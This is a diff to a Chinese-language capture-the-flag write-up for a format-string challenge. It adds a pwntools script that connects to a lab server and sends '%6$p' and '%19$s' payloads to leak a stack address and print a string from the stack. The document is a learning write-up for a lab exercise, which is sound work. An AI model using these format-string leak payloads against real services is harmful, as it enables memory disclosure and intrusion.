@@ -2,7 +2,22 @@
 本周的题目没有对长度限制，所以可以直接用pwnlib.fmtstr_payload梭，不需要手动精心构造（虽然原理并不复杂，但这个显然更快不是吗）
 
 ## fmt
-泄露栈上变量
+先来一种比较优雅的做法，用偏移直接把字符串打印出来，不需要痛苦地处理hex：  
+~~字符串在栈上？那不给他print出来~~  
+~~不会有人还在手转hex吧~~
+```python
+from pwn import *
+
+p = remote("10.20.55.12", 28074)
+p.sendline("%6$p")
+p.recvuntil('> ')
+leak = int(p.recvline(), 16)
+# 440的偏移是哪来的？我并不知道目标环境的确切偏移，所以写个循环把栈dump一遍就好了
+p.sendline(b"%19$s---" + p64(leak - 440))
+p.interactive()
+```
+
+然后是常规快速做法，泄露栈上变量。注意题目环境是64位。  
 
 ```python
 from pwn import *
